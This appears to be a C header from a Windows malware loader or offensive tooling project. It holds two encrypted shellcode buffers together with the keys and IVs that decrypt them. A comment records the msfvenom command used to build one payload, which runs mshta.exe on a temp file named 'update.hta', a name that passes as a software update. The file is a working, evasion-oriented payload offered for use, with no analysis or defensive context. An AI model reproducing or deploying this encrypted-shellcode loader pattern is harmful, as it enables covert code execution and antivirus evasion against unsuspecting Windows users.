#pragma once
#include <Windows.h>
unsigned char SHELLCODE_BUF[256] = { 0x45,
0x6f,0x4f,0xdd,0xde,0x3f,0xdc,0xed,0x5f,0x93,0xdf,
0x65,0xa6,0x8a,0x6c,0xdb,0x90,0x24,0xc4,0x91,0x34,
0xf2,0xa1,0xc,0xb3,0xec,0xb1,0x27,0x97,0x36,0x34,
0xd,0xfc,0xe4,0x5d,0x78,0xec,0xe8,0x6d,0x91,0x19,
0x9a,0xdb,0x7a,0x98,0xf4,0x73,0x63,0xb7,0xbb,0x55,
0xc4,0xc1,0xe5,0xb9,0x83,0x9c,0x31,0x82,0xf8,0x26,
0x39,0x84,0x4d,0xa2,0x64,0xfd,0x1e,0x30,0xf,0xb0,
0x61,0x94,0x5d,0x4f,0x71,0xdd,0xe6,0x7b,0xc6,0xc9,
0x70,0x9a,0x5f,0x69,0x37,0x77,0x1f,0xba,0xf3,0x9d,
0xbe,0x82,0x16,0xde,0xf1,0x1,0x8d,0xf0,0xec,0xde,
0x13,0xb5,0x91,0x94,0x2b,0xdd,0x75,0x2d,0xf2,0x6,
0xa9,0x45,0x78,0x2b,0xd2,0xb6,0xe1,0x26,0xa0,0xa1,
0x1c,0x6c,0x72,0xc2,0xd1,0xf4,0x8f,0xf0,0x2b,0x1a,
0x67,0xd4,0xbd,0x1f,0xc4,0x2e,0xd,0xf2,0x83,0x61,
0xaa,0xb3,0x8c,0xb7,0x6,0x54,0x8e,0xfa,0x66,0xa2,
0xe0,0x5f,0x1f,0xe1,0xac,0x79,0x81,0xf4,0x2c,0x1e,
0x67,0x5c,0x16,0x8c,0xdf,0x5e,0x21,0x17,0x1e,0xb3,
0x6c,0x18,0x71,0x2e,0x3d,0x54,0x9f,0xc,0xab,0x53,
0xb9,0xb9,0xd7,0xbe,0xc8,0xf5,0x37,0x1d,0x33,0xaf,
0xe0,0xd9,0x42,0xef,0x28,0xa6,0xdd,0x12,0x2f,0x18,
0x59,0x86,0x89,0xec,0xb8,0xde,0xb1,0x21,0xbc,0xbc,
0xb5,0x1b,0xcd,0xb6,0xb7,0x41,0x45,0xd3,0x8c,0x6,
0x3c,0x12,0xfe,0x6e,0xe,0xa1,0xb1,0x2c,0xbc,0x92,
0x27,0x45,0x1e,0xba,0x76,0xb4,0x84,0x36,0xf2,0x7f,
0x88,0x2c,0x9e,0x55,0xbb,0xdc,0x45,0x94,0x76,0x59,
0xa3,0x94,0x6f,0xfe,0x6a };
int SHELLCODE_LEN = 256;
const unsigned char KEY[32] = { 0xb6,
0x15,0x7f,0x79,0x2d,0x39,0x8c,0x85,0xf9,0x38,0x8,
0x49,0x14,0xbe,0x7d,0x4b,0xe8,0xf7,0x43,0xf3,0xc0,
0xf8,0x57,0x77,0x8f,0x9b,0x86,0x51,0x10,0x68,0x64,
0x12 };
int KEY_LEN = 32;
const unsigned char IV[16] = { 0x30,
0x31,0x32,0x33,0x34,0x35,0x36,0x37,0x38,0x39,0x61,
0x62,0x63,0x64,0x65,0x66 };
int IV_LEN = 16;
// command : msfvenom -p windows/x64/exec CMD="%WINDIR%/SysWOW64/mshta.exe %temp%/update.hta"


const char* FILE_DEST = "update.hta";
unsigned char LAUNCH_SHELLCODE_BUF[320] = { 0xa8,
0x11,0x23,0xae,0x75,0x1,0x3e,0xb7,0x4e,0x51,0x2,
0x73,0x89,0x38,0x3e,0x11,0x1,0xca,0x94,0x45,0x73,
0xa0,0x5f,0xef,0x3b,0xd0,0xc1,0x21,0xc8,0x2a,0x1b,
0xa1,0x16,0xa,0x6c,0xd0,0xb6,0xd,0x76,0xf3,0x86,
0xc2,0x3,0x9d,0x85,0x71,0x63,0xa3,0x56,0x84,0x50,
0xbf,0xb1,0x15,0x48,0x70,0x4e,0x8e,0x34,0x6,0x87,
0x73,0xc8,0x3d,0xaa,0x1b,0x77,0x5e,0xaa,0xcd,0x29,
0x42,0xde,0x80,0xc7,0x4b,0x1e,0xcf,0xdd,0x32,0xfd,
0x80,0x44,0xcc,0x5b,0x7a,0xc,0x97,0x93,0xd1,0xb1,
0xc5,0x53,0x43,0x71,0x58,0xe0,0x31,0x1f,0x2c,0xf3,
0xc6,0x15,0xd2,0x4e,0x99,0xce,0x3,0x5,0x44,0x90,
0xbf,0x8e,0x5,0xab,0x63,0xcc,0x7e,0xb2,0xc3,0x2f,
0x1b,0xbb,0x9b,0xc8,0x4a,0x50,0x5d,0xc4,0x10,0xc8,
0x55,0x93,0x68,0x2d,0x6c,0xdf,0x40,0x82,0x59,0xf8,
0x9b,0xb,0xe9,0x79,0xaa,0x55,0x39,0x95,0xfb,0x92,
0x22,0x19,0x3b,0x43,0x27,0x1a,0xbc,0x1d,0x48,0x2b,
0xde,0x83,0xdf,0xd5,0x4c,0xc,0xfd,0xa8,0x45,0xc7,
0xf1,0x79,0x40,0x25,0xa9,0x57,0x2f,0xf1,0x92,0xfa,
0xb0,0xdc,0x73,0x3a,0x7c,0xfe,0x94,0x28,0xf5,0xb9,
0xbb,0xae,0x54,0xc9,0x97,0xd6,0x2,0x14,0xfd,0xcb,
0x9c,0xdc,0xa7,0xf3,0xe6,0xea,0x56,0xd8,0xac,0x63,
0xbe,0x21,0xc3,0xf3,0xe6,0x1a,0xcd,0xee,0xa4,0xe6,
0xd5,0x22,0xf8,0x9,0x8f,0xd4,0x9a,0xb5,0x86,0xe5,
0xa1,0x5e,0xf0,0xe5,0x61,0x90,0xf7,0xbc,0xdf,0x24,
0x25,0x28,0xe5,0x93,0x10,0xe7,0x55,0xfe,0x75,0x62,
0x33,0x9a,0xc6,0xda,0xe0,0xd5,0xfd,0xa1,0xaf,0xf6,
0x8a,0xeb,0x94,0x6e,0x5c,0x80,0xc2,0xbc,0x4a,0xc4,
0x7b,0xab,0x62,0xdf,0x6f,0xeb,0x6f,0x3f,0x46,0xbc,
0x67,0xab,0x3,0xc7,0x24,0x99,0x64,0x6f,0xfb,0x9d,
0x4c,0x8a,0x6d,0xc5,0x9,0x62,0x86,0xa0,0x48,0xd9,
0xba,0x50,0xb7,0xd1,0x15,0xb1,0x5d,0x44,0x62,0xcb,
0x68,0x9a,0xeb,0xd,0x52,0x36,0xa9,0xc9,0xaa };
int LAUNCH_SHELLCODE_LEN = 320;
const unsigned char LAUNCH_KEY[32] = { 0xb6,
0x15,0x7f,0x79,0x2d,0x39,0x8c,0x85,0xf9,0x38,0x8,
0x49,0x14,0xbe,0x7d,0x4b,0xe8,0xf7,0x43,0xf3,0xc0,
0xf8,0x57,0x77,0x8f,0x9b,0x86,0x51,0x10,0x68,0x64,
0x12 };
int LAUNCH_KEY_LEN = 32;
const unsigned char LAUNCH_IV[16] = { 0x30,
0x31,0x32,0x33,0x34,0x35,0x36,0x37,0x38,0x39,0x61,
0x62,0x63,0x64,0x65,0x66 };
int LAUNCH_IV_LEN = 16;